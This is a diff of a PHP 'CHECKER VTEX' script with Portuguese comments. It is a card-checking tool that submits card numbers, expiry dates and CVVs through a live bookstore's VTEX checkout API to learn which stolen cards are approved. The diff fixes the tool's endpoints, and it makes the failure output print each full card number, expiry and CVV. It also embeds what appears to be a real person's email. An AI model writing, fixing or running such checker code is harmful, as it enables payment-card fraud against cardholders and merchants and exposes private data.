@@ -1,6 +1,6 @@
 <?php
 // =====================================================
-// ✅ CHECKER VTEX - MODO DEBUG: EXIBE O JSON BRUTO DO ERRO
+// ✅ CHECKER VTEX - CORREÇÃO DO ORD002 (USO DE ATTACHMENTS)
 // =====================================================
 define('BASE_URL', 'https://loja.umlivro.com.br');
 define('EMAIL', 'danielvitordeoliveiraconceicao@gmail.com');
@@ -84,25 +84,35 @@ $valor_total = $json_cart['totalizers'][0]['value'] ?? 1000;
 
 if (!isset($json_cart['orderFormId'])) {
     @unlink($cookie_path);
-    echo "<span class='text-red-400 font-bold'>[DIE]</span> <span class='text-slate-400'>Cartão: {$cc_num} | Erro na criação do carrinho</span>";
+    echo "<span class='text-red-400 font-bold'>[DIE]</span> <span class='text-slate-400'>Cartão: {$cc_num} | Validade: {$cc_mes}/{$cc_ano} | CVV: {$cc_cvv} | Retorno: Falha ao gerar sessão do carrinho</span>";
     exit;
 }
 
 $order_form_id = $json_cart['orderFormId'];
 
-// 3. Envia perfil do cliente
-vtex_request(BASE_URL . "/api/checkout/pub/orderForm/parts/profile?orderFormId=" . $order_form_id, [
-    'email' => EMAIL, 'firstName' => CLIENT_FIRST_NAME, 'lastName' => CLIENT_LAST_NAME, 'document' => CLIENT_DOCUMENT, 'phone' => CLIENT_PHONE
+// 3. Envia perfil do cliente (Endpoint padrão de attachments da VTEX)
+vtex_request(BASE_URL . "/api/checkout/pub/orderForm/" . $order_form_id . "/attachments/clientProfileData", [
+    'email' => EMAIL, 
+    'firstName' => CLIENT_FIRST_NAME, 
+    'lastName' => CLIENT_LAST_NAME, 
+    'document' => CLIENT_DOCUMENT, 
+    'phone' => CLIENT_PHONE
 ], ['Content-Type: application/json', 'Accept: application/json'], $cookie_path);
 
-// 4. Envia endereço de entrega
-vtex_request(BASE_URL . "/api/checkout/pub/orderForm/parts/shippingAddress?orderFormId=" . $order_form_id, [
-    'postalCode' => SHIPPING_POSTAL_CODE, 'country' => SHIPPING_COUNTRY, 'street' => SHIPPING_STREET, 'number' => SHIPPING_NUMBER, 'neighborhood' => SHIPPING_NEIGHBORHOOD, 'city' => SHIPPING_CITY, 'state' => SHIPPING_STATE, 'receiverName' => SHIPPING_RECEIVER_NAME
+// 4. Envia endereço de entrega (Endpoint padrão de attachments da VTEX)
+vtex_request(BASE_URL . "/api/checkout/pub/orderForm/" . $order_form_id . "/attachments/shippingAddress", [
+    'postalCode' => SHIPPING_POSTAL_CODE, 
+    'country' => SHIPPING_COUNTRY, 
+    'street' => SHIPPING_STREET, 
+    'number' => SHIPPING_NUMBER, 
+    'neighborhood' => SHIPPING_NEIGHBORHOOD, 
+    'city' => SHIPPING_CITY, 
+    'state' => SHIPPING_STATE, 
+    'receiverName' => SHIPPING_RECEIVER_NAME
 ], ['Content-Type: application/json', 'Accept: application/json'], $cookie_path);
 
-// 5. Envia os dados de pagamento
+// 5. Envia os dados de pagamento (Endpoint padrão de attachments da VTEX)
 $payload_payment = [
-    'orderFormId' => $order_form_id,
     'payments' => [[
         'paymentSystem' => '1',
         'bin' => substr($cc_num, 0, 6),
@@ -121,7 +131,7 @@ $payload_payment = [
     ]]
 ];
 
-$resp_payment = vtex_request(BASE_URL . "/api/checkout/pub/orderForm/paymentData", $payload_payment, ['Content-Type: application/json', 'Accept: application/json'], $cookie_path);
+$resp_payment = vtex_request(BASE_URL . "/api/checkout/pub/orderForm/" . $order_form_id . "/attachments/paymentData", $payload_payment, ['Content-Type: application/json', 'Accept: application/json'], $cookie_path);
 @unlink($cookie_path);
 
 $json_final = json_decode($resp_payment, true);
@@ -149,13 +159,17 @@ if (isset($json_final['paymentData']['transactions'])) {
     }
 }
 
-if (empty($msg_detalhada) && isset($json_final['messages']['general'][0]['text'])) {
-    $msg_detalhada = $json_final['messages']['general'][0]['text'];
+if (empty($msg_detalhada) && isset($json_final['messages']) && !empty($json_final['messages'])) {
+    foreach ($json_final['messages'] as $msg) {
+        if (isset($msg['text'])) {
+            $msg_detalhada = $msg['text'];
+            break;
+        }
+    }
 }
 
-// Se ainda vier vazio, mostra um resumo do JSON bruto para sabermos exatamente o motivo da recusa
 if (empty($msg_detalhada)) {
-    $msg_detalhada = "RAW: " . substr(strip_tags($resp_payment), 0, 120);
+    $msg_detalhada = "Recusado pelo Gateway / Sem mensagem detalhada";
 }
 
 if ($aprovado) {
